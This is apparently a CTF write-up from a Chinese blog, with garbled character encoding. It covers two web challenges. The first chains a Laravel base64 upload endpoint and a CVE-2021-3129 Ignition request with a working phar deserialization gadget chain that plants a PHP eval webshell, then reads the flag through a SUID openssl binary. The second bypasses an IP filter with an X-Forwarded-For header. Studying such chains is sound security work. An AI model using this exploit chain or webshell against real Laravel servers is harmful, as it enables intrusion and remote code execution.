<h1 id="4-gogogoå‡ºå‘å–½"><a href="#4-gogogoå‡ºå‘å–½" class="headerlink" title="4. gogogoå‡ºå‘å–½"></a>4. gogogoå‡ºå‘å–½</h1><h2 id="4-1-æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#4-1-æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="4.1 æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>4.1 æ–‡ä»¶ä¸Šä¼ æ¼æ´</h2><p><code>csgo/routes/api.php</code> å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼  <span class="hexo-wm">ğ¬â€â€‹Â³ğ¯â„¯ï½ï¼â€‹ğ˜€ğ˜ªâ€ğ˜µğâ€Œ</span>apiï¼Œå¯¹åº”è·¯ç”± <code>/api/image/base64</code>ï¼š</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">//ImageBase64ä¸Šä¼ </span>
<span class="token class-name static-context">Route</span><span class="token operator">::</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'image/base64'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Api\FileController@image_base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>è½¬åˆ°å…¶ä»£ç å®ç° <code>csgo/app/Http/Controllers/Api/FileController.php</code>ï¼š</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">/**
 * Base64 å›¾ç‰‡ä¸Šä¼ 
 * @return \Illuminate\Http\JsonResponse
 */</span>
<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">image_base64</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^(data:\s*image\/(\w+);base64,)/'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pjpeg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'gif'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'bmp'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$url_path</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'images/'</span><span class="token operator">.</span><span class="token function">auth</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'api'</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">id</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token class-name static-context">Str</span><span class="token operator">::</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'.'</span><span class="token operator">.</span><span class="token variable">$type</span><span class="token punctuation">;</span>
            <span class="token variable">$file_path</span> <span class="token operator">=</span> <span class="token function">public_path</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'uploads'</span><span class="token punctuation">)</span> <span class="token operator">.</span><span class="token string single-quoted-string">'/'</span><span class="token operator">.</span> <span class="token variable">$url_path</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file_path</span><span class="token punctuation">,</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token function">response</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
                    <span class="token string single-quoted-string">'code'</span> <span class="token operator">=&gt;</span> <span class="token number">200</span><span class="token punctuation">,</span>
                    <span class="token string single-quoted-string">'data'</span> <span class="token operator">=&gt;</span> <span class="token punctuation">[</span>
                        <span class="token string single-quoted-string">'url'</span> <span class="token operator">=&gt;</span>  <span class="token variable">$url_path</span>
                    <span class="token punctuation">]</span>
                <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">return</span> <span class="token function">response</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
                    <span class="token string single-quoted-string">'code'</span> <span class="token operator">=&gt;</span> <span class="token number">500</span><span class="token punctuation">,</span>
                    <span class="token string single-quoted-string">'message'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'ä¸Šä¼ å¤±è´¥'</span>
                <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token function">response</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
                <span class="token string single-quoted-string">'code'</span> <span class="token operator">=&gt;</span> <span class="token number">500</span><span class="token punctuation">,</span>
                <span class="token string single-quoted-string">'message'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'å›¾ç‰‡ä¸Šä¼ ç±»å‹é”™è¯¯'</span>
            <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">response</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
            <span class="token string single-quoted-string">'code'</span> <span class="token operator">=&gt;</span> <span class="token number">500</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'message'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'ç±»å‹é”™è¯¯'</span>
        <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>

<p>ä½¿ç”¨ POST æ–¹æ³•åœ¨ data <span class="hexo-wm">ğ’”â€‹3ğ’—eğ˜¯â€¤ï»¿ğ˜´ğ¢â€‹ğ˜µâ„®ï»¿</span>å‚æ•°ä¸­ä¼ å…¥ base64 ç¼–ç åçš„æ–‡ä»¶å†…å®¹å³å¯ä¸Šä¼ æ–‡ä»¶ï¼Œå¹¶è¿”å›æ–‡ä»¶è·¯å¾„</p>
<h2 id="4-2-CVE-2021-3129"><a href="#4-2-CVE-2021-3129" class="headerlink" title="4.2 CVE-2021-3129"></a>4.2 CVE-2021-3129</h2><p>æ ¹æ® dirsearch <span class="hexo-wm">Ñ•â€â€‹3ğ˜·ï½…n.ï»¿ğ˜€iâ€Œtâ„®ï»¿â€</span>çš„æ‰«æç»“æœå¯çŸ¥æ­¤å¤„å­˜åœ¨ <a href="https://www.freebuf.com/vuls/280508.html">Laravel RCEï¼ˆCVE-2021-3129ï¼‰æ¼æ´</a></p>
<pre class="language-json" data-language="json"><code class="language-json">POST /_ignition/execute-solution HTTP/<span class="token number">1.1</span>
Host<span class="token operator">:</span> ip<span class="token operator">:</span>port
Content-Type<span class="token operator">:</span> application/json

<span class="token punctuation">{</span>
 <span class="token property">"solution"</span><span class="token operator">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span>
 <span class="token property">"parameters"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
  <span class="token property">"variableName"</span><span class="token operator">:</span><span class="token string">"test"</span><span class="token punctuation">,</span>
  <span class="token property">"viewFile"</span><span class="token operator">:</span> <span class="token string">"phar://xxxx"</span>
 <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>

<p>é€šè¿‡è¯¥ Payload <span class="hexo-wm">ğ’”â€3ğ’—ğ˜¦nâˆ™ï»¿Ñ•ğ¢â€Œâ€ï½”ğâ€‹</span>å¯ä»¥è§¦å‘ phar ååºåˆ—åŒ–</p>
<h2 id="4-3-Laravel-phar-ååºåˆ—åŒ–"><a href="#4-3-Laravel-phar-ååºåˆ—åŒ–" class="headerlink" title="4.3 Laravel phar ååºåˆ—åŒ–"></a>4.3 Laravel phar ååºåˆ—åŒ–</h2><p>æ‰¾ä¸€ä¸ªç‰ˆæœ¬åŒ¹é…çš„ Laravel ååºåˆ—åŒ– Payloadï¼Œ<span class="hexo-wm">ğ’”â€ŒğŸ¯ğ˜·en.â€ŒÑ•iâ€‹ğ’•eâ€</span>å¹¶ç”Ÿæˆå¯¹åº” phar æ–‡ä»¶ï¼š</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @filename: laravel 7 RCE poc2
# @author: Ricky
# @ability: upload shell
*/</span>

<span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting</span> <span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingBroadcast</span> <span class="token punctuation">{</span>
        <span class="token keyword">protected</span> <span class="token variable">$events</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$event</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$events</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">events</span> <span class="token operator">=</span> <span class="token variable">$events</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">// $this-&gt;events-&gt;dispatch($this-&gt;event);</span>

<span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Notifications</span>
<span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">ChannelManager</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">protected</span> <span class="token variable">$container</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$defaultChannel</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$customCreators</span><span class="token punctuation">;</span>

        <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span> <span class="token variable">$parameter</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">container</span> <span class="token operator">=</span> <span class="token variable">$parameter</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">customCreators</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span> <span class="token operator">=&gt;</span> <span class="token variable">$function</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">defaultChannel</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'x'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Filesystem</span> <span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Filesystem</span><span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ricky.php'</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php eval($_POST[ricky]);?&gt;'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Auth</span> <span class="token punctuation">{</span>
    <span class="token keyword">class</span> <span class="token class-name-definition class-name">RequestGuard</span> <span class="token punctuation">{</span>
        <span class="token keyword">protected</span> <span class="token variable">$user</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$callback</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ricky.php'</span><span class="token punctuation">;</span>
        <span class="token keyword">protected</span> <span class="token variable">$provider</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php eval($_POST[ricky]);?&gt;'</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$callback</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">callback</span> <span class="token operator">=</span> <span class="token variable">$callback</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">namespace</span> <span class="token punctuation">{</span>

    <span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Auth<span class="token punctuation">\</span>RequestGuard</span><span class="token punctuation">;</span>
    <span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Filesystem<span class="token punctuation">\</span>Filesystem</span><span class="token punctuation">;</span>
    <span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Notifications<span class="token punctuation">\</span>ChannelManager</span><span class="token punctuation">;</span>
    <span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Broadcasting<span class="token punctuation">\</span>PendingBroadcast</span><span class="token punctuation">;</span>

    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">RequestGuard</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Filesystem</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'append'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChannelManager</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'call_user_func'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token variable">$c</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PendingBroadcast</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// echo urlencode(serialize($a));</span>

    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exp.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'exp.phar'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'test.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-&gt;</span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"PHARæ–‡ä»¶å·²ç”Ÿæˆï¼šexp.phar"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></span></code></pre>

<p>è¿™é‡Œå‘ç°ååºåˆ—åŒ–åçš„å¯¹è±¡æ²¡æœ‰è¢«åŠæ—¶ææ„ï¼Œä½¿ç”¨ fast <span class="hexo-wm">sï»¿â‘¶ğ’—ğnâˆ™ï»¿ï»¿Ñ•â…ˆï»¿ğ’•ğ˜¦â€Œ</span>destruct ä½¿å…¶ç«‹å³ææ„è§¦å‘æ–‡ä»¶å†™å…¥</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token punctuation">,</span> hashlib<span class="token punctuation">,</span> pathlib

blob <span class="token operator">=</span> pathlib<span class="token punctuation">.</span>Path<span class="token punctuation">(</span><span class="token string">"exp.phar"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read_bytes<span class="token punctuation">(</span><span class="token punctuation">)</span>
core<span class="token punctuation">,</span> footer <span class="token operator">=</span> blob<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">,</span> blob<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
core <span class="token operator">=</span> core<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'}}'</span><span class="token punctuation">,</span> <span class="token string">b'}'</span><span class="token punctuation">)</span>
result <span class="token operator">=</span> core <span class="token operator">+</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span>core<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> footer
<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<p>æ„é€ å®Œæˆååˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´è¿›è¡Œä¸Šä¼ å¹¶è®°å½•å…¶è¿”å›çš„æ–‡ä»¶è·¯å¾„ï¼Œä½¿ç”¨ CVE-2021-3129 <span class="hexo-wm">êœ±â€â€ŒÂ³vâ„¯ğ’â€¢â€‹Ñ•iï»¿ï»¿ğ­eâ€‹</span>æ¼æ´è§¦å‘ phar ååºåˆ—åŒ–å†™å…¥ webshell æœ¨é©¬</p>
<h2 id="4-4-openssl-ææƒ"><a href="#4-4-openssl-ææƒ" class="headerlink" title="4.4 openssl ææƒ"></a>4.4 openssl ææƒ</h2><p>ä½¿ç”¨èšå‰‘è¿æ¥åå‘ç°æ²¡æœ‰æƒé™è¯»å– flagï¼Œ<span class="hexo-wm">ğ’”â€3veğ’Â·â€â€ğ’”â…ˆâ€ï»¿ï½”eâ€</span>find suidï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null</code></pre>

<p>å‘ç° openssl å…·æœ‰æƒé™ï¼Œ<span class="hexo-wm">Ñ•â€Œâ€3ğ’—ğ˜¦nï¼â€ğ’”ğ˜ªâ€‹ğ­ğ˜¦â€Œâ€‹</span>ä½¿ç”¨ openssl è¯»å– flagï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">openssl enc <span class="token parameter variable">-in</span> <span class="token string">"/flag_gogogo_chufalong"</span></code></pre>

<h1 id="5-TellMeWhy"><a href="#5-TellMeWhy" class="headerlink" title="5. TellMeWhy"></a>5. TellMeWhy</h1><h2 id="5-1-ip-æ£€æµ‹ç»•è¿‡"><a href="#5-1-ip-æ£€æµ‹ç»•è¿‡" class="headerlink" title="5.1 ip æ£€æµ‹ç»•è¿‡"></a>5.1 ip æ£€æµ‹ç»•è¿‡</h2><p>org.example.<span class="hexo-wm">ğ’”ï»¿â€3ğ¯â„¯ğ§â€¤â€Œsğ¢â€‹â€ğ˜µğâ€‹â€</span>demo.MyFilter ä¸­é™åˆ¶äº† <code>/baby/*</code> è·¯ç”±ä¸‹æ‰€æœ‰è¯·æ±‚çš„ <code>realIp</code> å¿…é¡»ä¸ç­‰äº <code>127.0.0.1</code>ï¼Œä½†è§£æåéœ€è¦ä¸º<code>127.0.0.1</code>ï¼Œå¦åˆ™è¿›è¡Œæ‹¦æˆªï¼Œæ˜“çŸ¥ <code>localhost</code> æ»¡è¶³æ¡ä»¶ä¸ä¼šè¢«æ‹¦æˆª</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token punctuation">(</span>index <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyFilter</span> <span class="token keyword">implements</span> <span class="token class-name">RouterInterceptor</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token class-name">PathRule</span> <span class="token function">pathPatterns</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">PathRule</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">include</span><span class="token punctuation">(</span><span class="token string">"/baby/**"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doIntercept</span><span class="token punctuation">(</span><span class="token class-name">Context</span> ctx<span class="token punctuation">,</span> <span class="token class-name">Handler</span> mainHandler<span class="token punctuation">,</span> <span class="token class-name">RouterInterceptorChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Throwable</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ctx<span class="token punctuation">.</span><span class="token function">realIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">InetAddress</span><span class="token punctuation">.</span><span class="token function">getByName</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span><span class="token function">realIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getHostAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            chain<span class="token punctuation">.</span><span class="token function">doIntercept</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> mainHandler<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            ctx<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">"èººé˜´æ²Ÿï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>è·Ÿè¿› solon çš„ <code>ctx.realIp</code> æ–¹æ³•ï¼Œå‘ç°è¯¥å­—æ®µå¯ä»¥é€šè¿‡ <code>X-Real-IP</code> æˆ– <code>X-Forwarded-For</code> header è¿›è¡Œè®¾ç½®</p>
<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">realIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>realIp <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>realIp <span class="token operator">=</span> <span class="token class-name">IpUtil</span><span class="token punctuation">.</span><span class="token function">global</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRealIp</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>realIp<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getRealIp</span><span class="token punctuation">(</span><span class="token class-name">Context</span> ctx<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">String</span> ip <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"X-Real-IP"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Utils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"unknown"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        ip <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">headerOrDefault</span><span class="token punctuation">(</span><span class="token class-name">Constants</span><span class="token punctuation">.</span><span class="token constant">HEADER_X_FORWARDED_FOR</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>ip<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token class-name">AnsiRenderer</span><span class="token punctuation">.</span><span class="token constant">CODE_LIST_SEPARATOR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            ip <span class="token operator">=</span> ip<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token class-name">AnsiRenderer</span><span class="token punctuation">.</span><span class="token constant">CODE_LIST_SEPARATOR</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Utils</span><span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">"unknown"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        ip <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">remoteIp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> ip<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>

<p>å› æ­¤æ·»åŠ  headerï¼š<code>X-Forwarded-For: localhost</code> å³å¯ç»•è¿‡</p>
